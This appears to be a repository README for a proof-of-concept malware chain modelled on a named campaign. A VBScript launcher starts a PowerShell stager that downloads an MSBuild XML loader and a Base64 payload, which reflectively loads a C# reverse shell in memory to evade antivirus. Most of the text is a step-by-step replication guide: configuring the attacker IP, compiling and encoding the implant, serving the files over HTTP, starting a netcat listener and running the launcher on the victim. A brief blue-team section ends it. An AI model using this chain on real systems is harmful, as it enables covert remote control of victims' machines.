⚡ SHADOW#REACTOR – Advanced Malware Delivery & Reflective Loading PoC
[!CAUTION] Ethical Notice: This project was developed strictly for educational and cybersecurity research purposes. Using these techniques without prior authorization on third‑party systems is illegal. The author assumes no responsibility for any misuse of this material.

📖 Introduction
This repository presents a Proof of Concept (PoC) inspired by the SHADOW#REACTOR (2026) malware campaign. The project demonstrates how attackers leverage Living‑off‑the‑Land (LotL) techniques and Reflective Loading to execute malicious code directly in RAM, thereby bypassing traditional antivirus (AV) solutions and signature‑based EDR detections.

🏗️ Project Structure
Código
SHADOW-REACTOR-PoC/
├── delivery/
│   ├── launcher.vbs    # Initial vector (hidden VBScript)
│   ├── loader.xml      # MSBuild configuration for CodeTaskFactory injection
│   └── stager.ps1      # Automation for download, validation, and persistence
├── payloads/
│   └── implant.cs      # Reverse Shell in C# (TCP Socket)
└── qpwoe64.txt         # Final Base64 payload (generated after implant compilation)
⚙️ Technical Workflow
The attack chain is modular, executed in four stages, minimizing binary writes to disk:

Initial Vector → launcher.vbs invokes a hidden PowerShell interpreter.

Staging → stager.ps1 downloads loader.xml and the encrypted payload (qpwoe64.txt) into %TEMP%.

LotL Execution → MSBuild.exe processes the malicious XML.

Reflective Load → Inline C# code decodes the Base64 payload and loads the assembly directly into memory, initiating the Reverse Shell.

🛠️ Replication Guide (Controlled Lab Environment)
1. 🔧 IP Mapping & Configuration
Edit the files with the attacker machine’s IP (Kali Linux):

File	Line / Section	Expected Value
launcher.vbs	Line 3 (url)	http://KALI-IP/stager.ps1
stager.ps1	Line 2 ($server)	http://KALI-IP
implant.cs	GetConfig function	Kali IP encoded in Base64
💡 Tip: On Kali, generate the IP in Base64:

bash
echo -n "192.168.x.x" | base64
2. 🖥️ Payload Preparation (Windows Dev)
powershell
# 1. Define .NET compiler (adjust path if needed)
$csc = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"

# 2. Compile implant.cs
# IMPORTANT: Always provide the full path to your source file and output file
& $csc /target:exe /out:"<full-path-to-your-project>\payload.exe" "<full-path-to-your-project>\payloads\implant.cs"

# 3. Convert binary to Base64
# IMPORTANT: Use the exact path to your payload.exe, not just "payload.exe"
$bytes = [IO.File]::ReadAllBytes("<full-path-to-your-project>\payload.exe")
$b64   = [Convert]::ToBase64String($bytes)
[System.IO.File]::WriteAllText("<full-path-to-your-project>\qpwoe64.txt", $b64)
3. 📂 Transfer Files to Attacker Machine
After editing and generating the required artifacts, copy the following files to your attacker machine (Kali Linux):

delivery/stager.ps1

delivery/loader.xml

delivery/launcher.vbs

qpwoe64.txt

These files must be present on the attacker machine before starting the HTTP server.

4. 🌐 Server Setup (Kali Linux)
bash
# HTTP server (serves stager.ps1, loader.xml, qpwoe64.txt)
sudo python3 -m http.server 80

# Reverse Shell listener
nc -lnvp 443
5. 💻 Execution on Victim (Windows 10/11)
Run only launcher.vbs. The remaining steps (download, persistence, and in‑memory injection) occur automatically.

🛡️ Defensive Measures (Blue Team)
Process Detection: Monitor suspicious chains → wscript.exe → powershell.exe → msbuild.exe.

Binary Restrictions (LotL): Block MSBuild.exe and native compilers via AppLocker or WDAC.

Logging: Enable PowerShell Script Block Logging (Event ID 4104) to capture dynamic script execution.
